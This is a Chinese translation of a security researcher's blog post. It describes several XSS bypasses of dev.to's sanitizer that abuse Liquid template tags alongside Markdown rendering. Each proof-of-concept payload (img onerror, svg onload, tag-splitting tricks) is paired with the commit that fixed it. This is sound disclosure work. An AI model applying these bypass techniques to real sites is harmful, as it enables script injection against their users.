# 黑客开发 2:躲过安全检查

> 原文：<https://dev.to/antogarand/hacking-dev-2-slipping-through-security-3gca>

继我的上一篇文章[Pwned Together:Hacking dev . to](https://dev.to/antogarand/pwned-together-hacking-devto-hkd)之后，很少有其他安全研究人员对该网站进行了安全审计，并发现了其他漏洞。

其中一位是 [Becojo](https://twitter.com/becojo) ，他发现你可以使用液体标签绕过安全过滤器:

> 基本上，我可以在变量中`capture`输出 gist 标签，并使用 liquid 标签的`replace`函数修改它。

这代表了以下内容:

```
{% capture the_gist %}
{% gist https://gist.github.com/username/gist_id %}
{% endcapture %}

// the_gist now contains the HTML output of the gist tag evaluation

{{ the_gist | replace: "github", "evil" }} 
```

Enter fullscreen mode Exit fullscreen mode

这将给定的脚本标签的域从`gist.github.com/...`输出到`gist.evil.com/...`，这让我们控制脚本标签的域，给我们一个 XSS！

# 攻击漏洞

有了这些知识，我开始挖掘更多可能由液体标签引起的漏洞。

这让我和开发团队开始玩打地鼠游戏，在那里发现了该漏洞的许多变种。

## 替换

首先，从[我浏览开发源代码](https://dev.to/antogarand/what-happens-when-you-submit-an-article-3f8a)的经验来看，我知道 markdown 是在 liquid 标签之前呈现的。

还有一个标签和属性列表，它们总是在白名单中，因此你可以使用它们编写原始的 HTML，它不会被过滤掉:

> [rendered _ markdown _ scrubber . Rb](https://github.com/thepracticaldev/dev.to/blob/master/app/sanitizers/rendered_markdown_scrubber.rb)

```
class RenderedMarkdownScrubber < Rails::Html::PermitScrubber
  def initialize
    super
    self.tags = %w(a abbr add aside b blockquote br button center cite code col colgroup dd del dl dt em em figcaption h1 h2 h3 h4 h5 h6 hr i img li ol p pre q rp rt ruby small source span strong sub sup table tbody td tfoot th thead time tr u ul video)
    self.attributes = %w(alt class colspan data-conversation data-lang data-no-instant data-url em height href id loop name ref rel rowspan size span src start strong title type value width)
end 
```

Enter fullscreen mode Exit fullscreen mode

有了这些知识和可变标签，我知道我可以使用其他标签而不是 [capture](https://help.shopify.com/en/themes/liquid/tags/variable-tags#capture) 来获得 XSS。

使用[赋值](https://help.shopify.com/en/themes/liquid/tags/variable-tags#assign)标签，我们可以获得类似的结果。

```
{% assign myimg = '<img src="//x" class="alert()"/>' %}
{{ myimg | replace: "class", "onerror" }} 
```

Enter fullscreen mode Exit fullscreen mode

在这个概念证明中，我用`onerror`替换了`class`属性，得到了这个 XSS:

```
<img src="//x" onerror="alert()"/> 
```

Enter fullscreen mode Exit fullscreen mode

通过阻塞主要的赋值标签，如`replace`、`replace_first`和`remove`在[提交](https://github.com/thepracticaldev/dev.to/commit/fab4465bac40f57ec8903f520d0b5610d24413eb)时被修复。

## 赋值

既然我们不能使用过滤器，是时候用不同的解决方案了。

通过利用 assign 标签，因为 markdown 在 liquid 标签之前呈现，我们可以混合变量和 Markdown 来获得 XSS:

```
{% assign x = '<pre class="onerror=alert() test"></pre>' %}
<img src=x class="X {{x}}"/> 
```

Enter fullscreen mode Exit fullscreen mode

给我们 XSS:

```
 <img src=x class="X  <pre class="onerror=alert( ) test"></pre>"/> 
```

Enter fullscreen mode Exit fullscreen mode

[这里的解决方案](https://github.com/thepracticaldev/dev.to/commit/832e89237368b6a3c01bcbb6a88eaac79d5d3e1f)是完全移除捕获标签。

## 提取成分

既然我们不能有变量，是时候进行另一个旁路了！

[替换](https://shopify.github.io/liquid/filters/replace/)过滤文档不使用变量，而是在标签本身声明:

```
{{ "Take my protein pills and put my helmet on" | replace: "my", "your" }} 
```

Enter fullscreen mode Exit fullscreen mode

我们可以使用相同的操作，不使用`assign`标签，而是直接在 div 上应用我们的过滤器，并使用

```
{{ '<pre>' | first }}svg onload=alert(1) 
```

Enter fullscreen mode Exit fullscreen mode

这也使用了`first`过滤器，它没有从上一次过滤器移除提交中移除。

[补丁](https://github.com/thepracticaldev/dev.to/commit/178d0205eb311544718e93625b951095378ccec7)时间非常简单:将`first`标签列入黑名单。

从这一部分开始，很少有其他过滤器被移除，如`truncate`、`truncateword`和`slice`。

## 标签移除

我发现的下一个绕过方法是在默认标签上使用额外的参数，这将从 HTML 中省略，但可以正确解析 markdown 格式检查:

```
<img src="x" class="{%if'1" href="' != '' "> %}
inner" onerror=alert(document.domain)
{% endif %} 
```

Enter fullscreen mode Exit fullscreen mode

在这种情况下，第一个`{ %if ... %}`之间的部分将被删除，得到 HTML:

```
<img src="x" class="inner" onerror=alert(document.domain) 
```

Enter fullscreen mode Exit fullscreen mode

这是当他们删除所有默认的液体操作，如`if`、`for`和`comment`，这是与[合并后的公关](https://github.com/thepracticaldev/dev.to/pull/608/files)。

最后，我注意到`raw`标签没有和其他标签一起被禁用。这是因为标记在代码块内部使用，所以它们不能像其他代码块一样容易被阻塞。

这是我当时做的 POC:

```
<img src="x" class="before{% raw %}inside{% endraw ">%}rawafter"onerror=alert(document.domain) 
```

Enter fullscreen mode Exit fullscreen mode

注意原始标签的结尾，包含了`img`标签的结尾:`{ % endraw "> %}`

[最终的解决方案](https://github.com/thepracticaldev/dev.to/commit/32ed3ced1144a97264be8a4936a17b4b25f04136)是阻塞`raw`关键字之后的字符，这确保了该块不包含标签的结尾。

# 结论

像我这样的人是你不能有好东西的原因，也是网站更安全的一个原因。

在这种情况下，markdown 和 liquid tags 的融合导致了一些有趣的漏洞，尽管这些组件本身(在某种程度上)是安全的，但它们两个一起导致了一些非常有趣的漏洞。

如往常一样，请给我发送您的反馈，如果您想查看我的更多内容，请在 [Twitter](https://twitter.com/AntoGarand) 和 dev.to 上关注我！